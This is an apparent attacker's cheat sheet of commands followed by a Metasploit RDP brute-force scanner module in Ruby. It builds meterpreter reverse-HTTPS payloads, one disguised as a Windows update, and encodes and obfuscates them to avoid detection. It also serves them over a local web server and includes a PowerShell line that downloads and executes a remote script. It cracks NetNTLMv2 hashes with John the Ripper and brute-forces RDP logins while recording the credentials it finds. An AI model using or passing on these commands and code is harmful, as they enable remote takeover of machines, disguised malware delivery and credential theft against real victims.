msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f exe -o ~/win_update.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

python3 -m http.server 8080

Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation


http://192.168.1.128:8080/update_pacth.exe

zip --password SuaSenhaForte payload_protegido.zip payload_encoded.exe

IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.128:8080/payload.ps1')


john --wordlist=wordlist_personalizada_advanced.txt --format=netntlmv2 hash_john.txt

##
# RDP Login Brute Force Scanner for Metasploit
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'RDP Login Brute Force Scanner',
      'Description' => %q{
        This module attempts to brute force RDP logins on a range of hosts.
      },
      'Author'      => [ 'zerobyte-id', 'community' ],
      'License'     => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(3389),
        OptString.new('USERNAME', [true, 'The username to attempt']),
        OptPath.new('PASS_FILE', [true, 'File containing passwords to try']),
        OptInt.new('THREADS', [true, 'Number of concurrent threads', 4])
      ]
    )
  end

  def run_host(ip)
    passwords = ::File.readlines(datastore['PASS_FILE']).map(&:strip)
    user = datastore['USERNAME']

    passwords.each do |password|
      vprint_status("Trying #{user}:#{password} on #{ip}")
      begin
        sock = Rex::Proto::RDP::RDPConnection.new(ip, datastore['RPORT'])
        sock.connect
        if sock.authenticate(user, password)
          print_good("SUCCESS! #{ip}: #{user}:#{password}")
          report_cred(ip: ip, port: datastore['RPORT'], service_name: 'rdp', user: user, password: password)
          sock.disconnect
          return
        end
        sock.disconnect
      rescue ::Rex::ConnectionError
        print_error("Connection failed to #{ip}")
        return
      end
    end
  end
end







